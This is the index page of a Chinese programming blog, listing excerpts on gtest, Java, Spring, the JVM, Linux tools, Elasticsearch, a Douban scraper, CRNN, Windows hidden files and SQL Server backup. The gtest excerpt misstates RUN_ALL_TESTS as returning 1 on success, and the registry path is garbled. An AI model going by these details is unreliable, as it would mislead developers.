<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86733bfa8cfc4afe08905cd3a3d94715/" rel="bookmark">
			GoogleTest从入门到入门，小白都能看懂的gtest详细教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单元测试 项目管理和技术管理中做单元测试，衡量一个软件是否正常的标准，良好的单元测试以及足够多的覆盖率，至少保证关键功能，关键业务的覆盖率接近100%。
gtest是谷歌公司发布的一个跨平台（Linux、Mac OS、Windows等）的C++单元测试框架，它提供了丰富的断言、致命和非致命判断、参数化、死亡测试等等。
两种断言：
ASSERT_*：当断言失败时，产生致命错误、并终止当前函数。EXPECT_*：当断言失败时，产生非致命错误，并且不会终止当前函数。通常都会用EXPECT_*，因为能在一次测试中测试出更多的失败情况。如果要在出现失败测试时立即终止程序，则要选择ASSERT_*==注意：==因为ASSERT_*会在失败时立即终止函数，那么就可能跳过后面程序中进行清理工作的代码，可能会产生内存泄露。 测试stack main函数在gtest_main.cc中，可以把这个main函数复制到你的代码里面，你将拥有它的控制权。
GTEST_API_ int main(int argc, char **argv) { std::cout &lt;&lt; "Running main() from gtest_main.cc\n"; testing::InitGoogleTest(&amp;argc, argv);//解析命令行中的GoogleTest参数，它允许用户通过多样的命令行参数来控制测试程序的行为（即定制命令行参数的行为） return RUN_ALL_TESTS();//将会搜索不同的Test Case和不同的源文件中所有已经存在测试案例，然后运行它们，所有Test都成功时返回1，否则返回0。 } 非致命断言，即使宏判断失败，程序仍然会顺序执行后面的代码
每一个测试实例都必须初初始化每一个对象
==TEST()宏==的第一个参数是Test Case的名称，第二个参数是隶属于第一个Test Case参数的Test的名称。GoogleTest根据Test Case对测试结果进行分组，所以一些相关的Test应该放在同一个Test Case中。
#include "gtest/gtest.h" #include "MyStack.h" //测试实例1 TEST(testStack, simpletest) { MyStack st; st.push(4); EXPECT_EQ(4, st.pop());//使用Google Test宏进行测试（非致命断言） } //测试实例2 TEST(testStack, testAll) { MyStack st; st.push(9); st.push(28); int val = st.pop(); EXPECT_EQ(28, val);//28等于val则测试通过（非致命断言） EXPECT_NE(0,val);//0不等于val则测试通过（非致命断言） EXPECT_GT(29, val);//29大于val则测试通过（非致命断言） EXPECT_GE(29, val);//29大于等于val则测试通过（非致命断言） EXPECT_TRUE(val == 28) &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86733bfa8cfc4afe08905cd3a3d94715/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8449f4dab9977ac629f00346a9085b96/" rel="bookmark">
			Java学习之重写与重载的异同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、重写与重载
重写是父类与子类之间多态性的一种表现，而重载是一个类中多态性的一种表现，且重载“同名不同参”。子类的对象使用这个方法时，将调用子类的定义，对这个类的对象而言，父类的定义就被“屏蔽”掉了。
二、方法的重写与重载
方法的重写：如果在子类中定义某方法与其父类有相同的名称和参数，则该方法被“重写”；
方法的重载：如果在一个类中定义多个同名方法，它们或有不同参数个数或有不同的参数类型，则该方法被“重载”。被重载的方法是可以改变返回值类型的。
总结两者的异同：
1.不同：
1）重写发生在父类、子类之间，而重载发生在一个类中。
2）重写实现的是运行时的多态性，而重载实现的是编译时的多态性。
3）“同参”（相同的参数列表）被认为是“重写”，而“同名不同参”（不同的参数列表）被认为是“重载”。
4）重写要求有兼容的返回类型，而重载对返回类型没有特殊的要求，不能根据返回值进行区分。
2.相同：
1）重写（Overriding）与重载(Overloading)是Java语言多态性的不同表现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4c2ba7a71dd5809f7f53b2ed4bf9b14/" rel="bookmark">
			linux性能分析工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sysstat sysstat是一个linux性能工具，用来监控和分析系统的性能，以下案例中会用到这个包的2个命令mpstat和pidstat。
mpstat 是一个常用的多核CPU性能分析工具用来实时查看每个CPU的性能指标，一级所有CPI的平均指标。 # -P ALL 表示监控所有 CPU，后面数字 5 表示间隔 5 秒后输出一组数据 mpstat -P ALL 5 Linux 4.18.0-147.5.1.el8_1.x86_64 (service) 2021年06月17日 _x86_64_	(4 CPU) 11时02分41秒 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 11时02分46秒 all 53.29 0.00 5.72 0.00 1.22 2.28 0.00 0.00 0.00 37.49 11时02分46秒 0 8.69 0.00 15.56 0.00 0.61 0.20 0.00 0.00 0.00 74.95 11时02分46秒 1 99.40 0.00 0.00 0.00 0.60 0.00 0.00 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4c2ba7a71dd5809f7f53b2ed4bf9b14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed4e06b46232909c134a65549d9c8432/" rel="bookmark">
			Java面试总结，上海银行2021春招面试开始了吗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 JVM的内存区域布局 java代码的执行步骤有三点
java源码文件-&gt;编译器-&gt;字节码文件字节码文件-&gt;JVM-&gt;机器码机器码-&gt;系统CPU执行 JVM执行的字节码需要用类加载来载入；字节码文件可以来自本地文件，可以在网络上获取，也可以实时生成。就是说你可以跳过写java代码阶段，直接生成字节码交由JVM执行
其中Java虚拟机栈、程序计数器、Heap、本地方法栈、Metaspace属于JVM运行时的内存；按是否线程共享则可以分两类
JAVA堆和MetasSpace元空间属于线程共享的；虚拟机栈和本地方法栈、程序计数器是线程私有的
2 JVM五大数据区域介绍 2.1 程序计数器（Progarm Counter Register)
一块较小的内存空间, 是当前线程所执行的字节码的行号指示器。线程有一个独属的程序计数器，字节码解析工作时需要程序计数器来选取下一指令，分支、循环、跳转等依赖它正在执行java方法线程的计数器记录的是虚拟机字节码指令的地址；如果还是Native方法，则为空程序计数器内存区域是唯一一个在虚拟机中没有规定任何OutOfMemoryError错误的区域 2.2 虚拟机栈(Virtual Machine Stack)
Java方法执行的内存模型：每个方法在执行的同时都会创建一个栈帧(Stack Frame)用于存储局部变量表、操作数栈、动态链接、方法出口等信息每一个方法从调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中入栈到出栈的过程栈帧是用来存储数据和部分过程结果的数据结构，同时也被用来处理动态链接(Dynamic Linking)、 方法返回值和异常分派(Dispatch Exception)。栈帧随着方法调用而创建，随着方法结束而销毁(无论方法是正常完成还是异常完成)如果线程请求的栈深度大于虚拟机允许深度，则抛出StackOverflowError；扩展时无法申请到足够内存，则抛出OutOfMemeryError 2.3 本地方法栈(Native Method Stack)
本地方法栈和虚拟机栈作用类似，区别是虚拟机栈为执行Java方法服务，而本地方法栈则为Native方法服务。(HopShot的实现 直接把本地方法栈和虚拟机栈合二为一） 上述3类区域，生命周期与Thread相同，即：线程创建时，相应的内存区创建，线程销毁时，释放相应内存
2.4 堆(Heap)
线程共享的一块内存区域，几乎所有的对象实例在这里分配内存，也是垃圾收集器进行垃圾收集的最重要的内存区域。因此很多时候也叫GC堆线程私有的分配缓存区(Thread Local Alloaction Buffer)也是在堆划分出来的JDK8的版本，因使用元空间代替永久代，字符串常量池和类的静态变量也放入java堆中 2.5 元空间(MetaSpace)
主要存储类的元数据，比如类的各种描述信息，类名、方法、字段、访问限制等，既编译器编译后的代码等数据运行时常量池：Class文件中除了有类的版本、字段、方法等描述等信息外；还有一项信息是常量池，用于存放编译期生成的各种字面量和符号引用，这部分将在类加载后存放到元空间的运行时常量池中 使用元空间代替永久代原因
永久代的大小是在启动时固定好的，很难进行调优；太大则容易导致永久代溢出；太小在运行时，容易抛出OutOfMemeryError字符串存在永久代中，使用时易出问题，由于永久代内存经常不够用，爆出异常OutOfMemoryError: PermGen CodeCache
JVM生成的native code存放的内存空间称之为Code Cache；JIT编译、JNI等都会编译代码到native code，其中JIT生成的native code占用了Code Cache的绝大部分空间 直接内存
它并不是虚拟机运行时数据区的一般分，也不在规范定义。JDK1.4，引入了Channel(通道)与Buffer(缓存区)的I/O方式，它可以使用Native函数分配堆外内存，可通过DirectByteBuffer操作。 3 JVM运行时内存布局和JMM内存模型区别 JVM内存区域是指JVM运行时将内存数据分区域存储，强调对内存空间的划分JAVA内存模型是Java语言在多线程并发情况下对于共享变量内存操作的规范：解决变量在多线程的可见性、原子性的问题 言尽于此，完结 无论是一个初级的 coder，高级的程序员，还是顶级的系统架构师，应该都有深刻的领会到设计模式的重要性。
第一，设计模式能让专业人之间交流方便，如下： 程序员A：这里我用了XXX设计模式
程序员B：那我大致了解你程序的设计思路了
第二，易维护 项目经理：今天客户有这样一个需求…
程序员：明白了，这里我使用了XXX设计模式，所以改起来很快
第三，设计模式是编程经验的总结 程序员A：B，你怎么想到要这样去构建你的代码
程序员B：在我学习了XXX设计模式之后，好像自然而然就感觉这样写能避免一些问题
第四，学习设计模式并不是必须的 程序员A：B，你这段代码使用的是XXX设计模式对吗？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed4e06b46232909c134a65549d9c8432/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/205e97bc347c7d7eb05a0f3b8bb05621/" rel="bookmark">
			vue适配，在屏上放大缩小内容按比例调整
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue适配，在屏上放大缩小内容按比例调整
如图整屏排布，这里以1920屏幕为例
屏可视区缩小
实现过程
1、项目安装插件
npm i lib-flexible -S
npm i px2rem-loader --save-dev
2、在index.html中更改meta
例如：去掉之前的meta
&lt;meta http-equiv=X-UA-Compatible content="IE=edge"&gt; 3、在main.js中引入
import 'lib-flexible’
4、 在build里的utils
然后第一步
第二步
5、 在node module中找到
然后修改
项目中对宽高之类的设定可用px为单位，系统会直接转为rem
重新启动项目,可以实现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4c358267282f55493cc6a0aeb04ca21/" rel="bookmark">
			【Python】报错 ‘int‘ object is not callable
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： Python Flask框架编程，编写GET函数返回值
问题描述： 报错 'int' object is not callable
Traceback (most recent call last): File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/flask/app.py", line 1966, in make_response rv = self.response_class.force_type(rv, request.environ) File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/werkzeug/wrappers/base_response.py", line 269, in force_type response = BaseResponse(*_run_wsgi_app(response, environ)) File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/werkzeug/wrappers/base_response.py", line 26, in _run_wsgi_app return _run_wsgi_app(*args) File "/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/werkzeug/test.py", line 1119, in run_wsgi_app app_rv = app(environ, start_response) TypeError: 'int' object is not callable 原因分析： Flask框架的return返回值不允许是int类型。
允许的类型有【普通字符串】【JSON数据】【元祖】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/713eccc368bc25b6b8ee307b197e1f7c/" rel="bookmark">
			小米8青春版google登录通信出现问题解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在设置里找到自启动的选项，把所有关于google的全部勾选上就没问题了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b0d5a96a9f6a592a4aba134f1ac9e5d/" rel="bookmark">
			InitializingBean、BeanPostProcessor、init-method、@PostConstruct执行先后顺序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、理论 @PostConstruct 注解好多人以为是Spring提供的。其实是Java自己的注解。该注解被用来修饰一个非静态的void（）方法。被@PostConstruct修饰的方法会在服务器加载Servlet的时候运行，并且只会被服务器执行一次。PostConstruct在构造函数之后执行，init（）方法之前执行。通常我们会是在Spring框架中使用到@PostConstruct注解 该注解的方法在整个Bean初始化中的执行顺序：Constructor(构造方法) -&gt; @Autowired(依赖注入) -&gt; @PostConstruct(注释的方法)。
而 InitializingBean、BeanPostProcessor、init-method 就全都是Spring体系中的，要想搞清楚执行的先后顺序，首先要了解Spring中对 Java Bean生命周期的管理。
在传统的Java应用中，bean的生命周期很简单，使用Java关键字 new 进行Bean 的实例化，然后该Bean 就能够使用了。一旦bean不再被使用，则由Java自动进行垃圾回收。
相比之下，Spring管理Bean的生命周期就复杂多了，正确理解Bean 的生命周期非常重要，因为Spring对Bean的管理可扩展性非常强，下面详细介绍下一个Bean的构造过程。
Bean 的完整生命周期：
根据上图，得到我们标题中的问题，InitializingBean、BeanPostProcessor、init-method 到底是谁先执行的呢？
整理后，简单逻辑如下图：
Spring启动，查找并加载需要被Spring管理的bean，进行Bean的实例化
Bean实例化后对将Bean的引入和值注入到Bean的属性中
如果Bean实现了BeanNameAware接口的话，Spring将Bean的Id传递给setBeanName()方法
如果Bean实现了BeanFactoryAware接口的话，Spring将调用setBeanFactory()方法，将BeanFactory容器实例传入
如果Bean实现了ApplicationContextAware接口的话，Spring将调用Bean的setApplicationContext()方法，将bean所在应用上下文引用传入进来。
如果Bean实现了BeanPostProcessor接口，Spring就将调用他们的postProcessBeforeInitialization()方法。
如果Bean 实现了InitializingBean接口，Spring将调用他们的afterPropertiesSet()方法。类似的，如果bean使用init-method声明了初始化方法，该方法也会被调用
如果Bean 实现了BeanPostProcessor接口，Spring就将调用他们的postProcessAfterInitialization()方法。
此时，Bean已经准备就绪，可以被应用程序使用了。他们将一直驻留在应用上下文中，直到应用上下文被销毁。
如果bean实现了DisposableBean接口，Spring将调用它的destory()接口方法，同样，如果bean使用了destory-method 声明销毁方法，该方法也会被调用。
二、实践 InitializingBean InitializingBean接口为bean提供了初始化方法的方式，它只包括afterPropertiesSet方法，凡是继承该接口的类，在初始化bean的时候都会执行该方法。
@PostConstruct 在类中的方法上加上注解@PostConstruct后，初始化bean的前会调用被注解的方法
package com.wzz.test.demo.springDemo; import org.springframework.beans.factory.InitializingBean; import org.springframework.stereotype.Service; import javax.annotation.PostConstruct; @Service public class MyServiceImpl implements MyService, InitializingBean{ @Override public void afterPropertiesSet() throws Exception { System.out.println("afterPropertiesSet method: myServiceImpl"); } @PostConstruct public void postConstructMethod() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b0d5a96a9f6a592a4aba134f1ac9e5d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/634fee700865ee5b40e30c756a72c99c/" rel="bookmark">
			泛型一般有三种使用方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		泛型一般有三种使用方式:泛型类、泛型接口、泛型方法。
1.泛型类：
//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型 //在实例化泛型类时，必须指定T的具体类型 public class Generic&lt;T&gt; { private T key; public Generic(T key) { this.key = key; } public T getKey() { return key; } } 如何实例化泛型类：
Generic&lt;Integer&gt; genericInteger = new Generic&lt;Integer&gt;(123456); 2.泛型接口 ：
public interface Generator&lt;T&gt; { public T method(); } 实现泛型接口，不指定类型：
class GeneratorImpl&lt;T&gt; implements Generator&lt;T&gt;{ @Override public T method() { return null; } } 实现泛型接口，指定类型：
class GeneratorImpl implements Generator&lt;String&gt;{ @Override public String method() { return "hello"; } } 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/634fee700865ee5b40e30c756a72c99c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f2a2a268d7e1616581290994b5aead0/" rel="bookmark">
			Elasticsearch指定以逗号分词查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Kibana集合设置 PUT demo_v1{ "settings": { "index": { "number_of_shards": "1", "number_of_replicas": "1" }, "analysis": { "analyzer": { "comma": { "type": "pattern", "pattern":"," } } } }, "mappings": { "properties": { "id": { "type": "long" }, "goods_list": { "type": "nested", "properties": { "goods_name": { "type": "text", "fields": { "keyword": { "type": "keyword", "ignore_above": 256 } }, "analyzer": "ik_max_word" }, "goods_type_no": { "type": "text", "analyzer": "comma", "search_analyzer": "comma" } } } } } } 说明：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f2a2a268d7e1616581290994b5aead0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a23e4052c7e39ca0a8c607acc9d6b319/" rel="bookmark">
			python爬虫（案例）——豆瓣读书爬虫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 要爬取的内容一级页面（分类中图书的列表）二级页面（每本书的详情页） 本案例中的防封ip小技巧多用几个user-agent（随机抽取）设置间隔时间 完整代码 本篇文章为豆瓣读书爬虫的案例，采用了xpath解析式，比较基础，未涉及其他深入的爬虫知识 要爬取的内容 根据豆瓣图书中不同的分类爬取图书的相关信息 ( 每个分类豆瓣最多给50页数据 ）
一级页面（分类中图书的列表） 爬取 ： 书名（文本和url），作者，出版社，出版日期，评价数，缩略图链接，短简介
二级页面（每本书的详情页） 通过一级页面 书名的url链接进入二级页面
爬取 ： 评分，内容简介，作者简介，标签
本案例中的防封ip小技巧 多用几个user-agent（随机抽取） def header_x(): # 随机获取一个headers user_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a23e4052c7e39ca0a8c607acc9d6b319/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/870a51ba2a9edfadc62ce99af52cabd1/" rel="bookmark">
			函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 短小，20行封顶最佳每个函数只做一件事，而且每个函数都依序把你带到下一函数，做了同一抽象层次下的事。要判断函数是否不止做了一件事，就是看是否能再拆出一个函数，该函数不仅只是单纯的重新诠释其实现。每个函数一个抽象层级。函数中的语句都要在同一层级上，自顶向下读代码，向下规则，每个函数后面都跟着位于下一抽象层级的函数。确保每个switch语句都埋藏在较低的抽象层次，而且永远不重复使用描述性名称。给每个私有方法取个具有描述性名称，别害怕长名称，让函数能说清其功能。函数参数越少越好，多于两个考虑封装对象。
优点：易于理解，测试
（1）一元函数：1.关于参数的问题，2.操作该参数，转换为其他输出。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58c080915ceffa6eba74b7622ad9feeb/" rel="bookmark">
			CRNN文本识别模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CRNN文本识别模型 描述模型结构CNNRNNCTC 描述 CRNN是一种简单高效的文本识别模型。相比与Attention类型的文本识别模型，其具有如下优缺点。
优点：
容易训练，模型容易收敛，且鲁棒性较高。易于部署，模型结构简单，inference速度快且支持变长输入，适合文本长度变化较大的生产环境。 缺点：
识别准确率相对较低，在包含大量中文字符集情况下，会比RARE类型的Attention模型低不少，英文字符集的情况下会低更多。对于艺术字等有较大形变的短文本，或自然场景下的变化较大的文本，CRNN识别准确率较低。 模型结构 CRNN模型是由图片特征提取层（CNN）、序列化建模层（BiLSTM）以及解码层（CTC）组成。模型结构如图所示：
CNN 图片在输入网络前会进行长度的补充与缩放用于组成固定形状的batch送入模型训练。一般选择的固定长度是由数据集决定的，包含95%左右数据的长度是比较合适的。选择过大的长度可能容易出现CTC loss 不稳定甚至无法训练的情况。所有图片的高度都是固定的，一般选择32。宽度大于batch宽度的可以直接resize，小于batch宽度的需要补0或1。
CNN结构用于提取图片特征。一般情况下选择resnet18就够用了，在特别复杂的情况下也可以选择更复杂的模型，如resnet50等。但是由于模型更加复杂，batchsize需要适当减少，模型收敛时间也会相对变长。
为了将图片特征提取变成高度为1的特征序列，resnet18需要做一些调整，使其高度方向的stride为32，宽度方向的stride为4。实验证明，在CNN模型最有使用kernel size为（2，2）的maxpooling有助于提升模型的鲁棒性。
RNN RNN通常使用BiLSTM。尝试过BiGRU以及transformer，效果没有BiLSTM好。LSTM是一种时序模型，其结构如下。
LSTM包含三个门，第一个为遗忘门，其决定了cell state的保存比例。第二个门是输入门，该门将当前输入及上次输出组合后添加至cell state。最后一个门为输出门，将cell state与ht-1以及xt 结合后输出，作为ht。
CTC CTC用于对齐输出的文本，它分为前向与反向两个阶段。前向时只需要按照CTC解码的方式解码就行，反向时需要求CTC Loss。CTC Loss为给定输入x的情况下所有可能结果为l的路径的概率的和。
其中pi代表经过 B变化后等于l的路径
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/187a95fc6f3a8d8314c7407393abf41a/" rel="bookmark">
			对于大学里计算机方向的专业哪些比较好？近年出现的大数据和云计算专业有何看法？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以阿里云为例，阿里云推出的ACP认证包括云计算、大数据、云安全、人工智能及架构等方面，哪个专业比较好？目前来讲，考取ACP云计算法方向的用户最多，毕竟云计算是基础。参考：阿里云ACP认证考试攻略、考试心得、费用及常见问题
我只能用数据说话，目前考取云计算认证的人数较多。至于哪个比较好？真的很难说，如果是我，大数据吧。
聊完这些，那么该选择哪家的云服务器呢？ 主流云平台例如阿里云、腾讯云的活动机在安全性、稳定性、易用性及高性价比等方面都占据绝对的优势，是上云的最佳选择。
国内云服务器性能和配置对比参阅：【云服务器推荐】腾讯云、阿里云、华为云服务器价格和配置评测
部分参靠来源：云吞铺子
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5121d5b57c1dedda59dbc2cb3fd6ded0/" rel="bookmark">
			如何利用计算机隐藏文件,怎么把隐藏的文件夹显示出来 多种方法介绍【图文教程】...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于很多电脑新手都会遇到这样的问题，怎么把隐藏的文件夹显示出来，其实操作起来非常简单哦，今天小编就是来教大家如何将隐藏的文件夹显示出来，有需要的就快来看看吧。
怎么把隐藏文件显示出来
方法一 ：这个方法也是我们使用的比较多的一个方法，如果想要显示文件就先试试这个方法，绝对是又好操作又实用的。
1、首先打开我的电脑。
2、进入工具页面，进入工具页面之后 看到一个文件夹选项，点击查看它。
3、就可以看到一个显示系统文件夹的内容这个命令啦，将前面打勾，并且在将底下的隐藏受保护的操作系统文件前面的勾去掉。
4、基本这样操作就可以看到我们隐藏的文件夹了，选择好之后系统可能会出现一个提示警告，不用在意直接点击确定保存就可以将隐藏的文件都看到啦。
注意事项：在显示系统文件夹选项中有隐藏系统文件显示，这个隐藏系统文件最好不要讲这个选项勾选，因为如果将隐藏的系统文件显示出来之后可能会导致电脑系统的损坏，只需要操作以上小编给大家的步骤就可以了。
方法二： 同样是一个很简单的方法。
1、打开电脑，然后在电脑的菜单栏上打开开始菜单。
2、电脑则会跳出一个界面，在这个界面中找到控制面板选项，点击进入。
3、同样的会跳出一个界面选择外观选项，进入即可。
4、最后就可以直接看到显示隐藏文件以及文件夹，点击选择你隐藏的文件就出现了。
方法三 ：当前两种方法都不适用的时候可以使用这个方法进行。
1、首先打开电脑，新建一个记事本文件，这个步骤相信大家都会操作。
2、输入一串密令，“[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionExplorerAdvancedFolderHiddenSHOWALL] ”这串命令大家可以记下，在操作电脑中都非常的常见并且需要。
3、在输入CheckedValue"=dword:00000001 ，保存文件名为显示被影藏文件，这个也是隐藏文件类型的扩展名字。
4、然后双击运行这个文件，在到文件夹选项中设置显示隐藏文件基本就可以操作成功啦。
怎么把隐藏的文件显示出来大家都学会了吗，上面介绍的三种方法中有你喜欢的嘛，其中第一种方法更适用于xp系统以及win7系统，第二种系统更适用于win8系统哦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e381045bbf1a0b9d63cb8d06807b2b2/" rel="bookmark">
			二阶段目标检测总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述：
最新几年的论文都是在单阶段、Transform上进行发掘提升，基本上2020-2021年二阶段论文全军覆没，这篇博文也是总结2016-2019年的发展，最后一篇CenternetV2比较特殊，不能完全算作传统意义的二阶段网络。
目前什么地方还使用二阶段论文？
比赛场景，经常使用FasterRCNN的变种+其它网络进行联合预测目标比较小的场景(使用较少，一般用anchor-free、增大输入去代替、分割图像检测)辅助一阶段使用，和(2)类似但不同。比如检测远距离人形+人脸，方案一：先检测人，后检测人脸，两个都是OneStage。方案二：使用TwoStage网络，第一阶段检测人形，第二阶段检测人脸。当然只有第二类别是第一类别的从属，且是唯一关系才能进行！ 一. FasterRCNN 以torchvision给出的demo为例子：
第一阶段，和基础SSD等一阶段操作类似，但是这一阶段会立刻输出候选区域 https://github.com/pytorch/vision/blob/183a722169421c83638e68ee2d8fc5bd3415c4b4/torchvision/models/detection/rpn.py#L29
将候选区域从FPN输出的feature上抠出来
使用ROIPooling对齐候选特征的大小
https://github.com/pytorch/vision/blob/183a722169421c83638e68ee2d8fc5bd3415c4b4/torchvision/ops/poolers.py#L83-L277
第二阶段，直接进行FC细化Reg/Cls，当然这里只能是一个候选区域最多一个目标。 class FastRCNNPredictor(nn.Module): """ Standard classification + bounding box regression layers for Fast R-CNN. Args: in_channels (int): number of input channels num_classes (int): number of output classes (including background) """ def __init__(self, in_channels, num_classes): super(FastRCNNPredictor, self).__init__() self.cls_score = nn.Linear(in_channels, num_classes) self.bbox_pred = nn.Linear(in_channels, num_classes * 4) def forward(self, x): if x.dim() == 4: assert list(x.shape[2:]) == [1, 1] x = x.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e381045bbf1a0b9d63cb8d06807b2b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17cd1ef0f53a1994a13fdbc6f25be9c4/" rel="bookmark">
			SQL Server数据库关于bak类型文件的备份与还原
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注：本文只做最简单流程描述，欢迎留言补充。谢谢 Thanks♪(･ω･)ﾉ
涉及工具软：SQL Server Management Studio
并且假装已经连接到相关数据库。
一、数据备份
1、右键点击要备份的数据库-&gt;【任务(T)】-&gt;【备份(B)...】，打开备份数据库窗体。
2、在备份数据库窗体右下部分可以看到备份到的路径，可以使用默认的，也可以自己添加。
注：自己设置路径的话记得在设置文件名时在末尾添加.bak.
至此，设置完成后，在备份数据库窗体右下部分点击确定即可生成备份文件。
二、数据还原
注：请先在本地准备好待恢复的bak文件
右键【数据库】-&gt;【还原数据库(R)...】，打开还原数据库窗体。
第1步：选择原设备，点击右侧三个点(...)添加待还原bak文件。
第2步：在目标数据库中选择目标数据库。
第3步：勾选用户还原的备份文件。
第4步：点击选项，切换后选择数据库还原策略。如果为空数据库或者数据库尚未创建选择覆盖现有数据库。请谨慎操作。
第五步：点击确定。
配置示意图如下：
欢迎分享、关注、点赞、收藏、打赏。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5959f424280adce2d67244fab9dc9bf7/" rel="bookmark">
			决策树 C4.5 公式流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
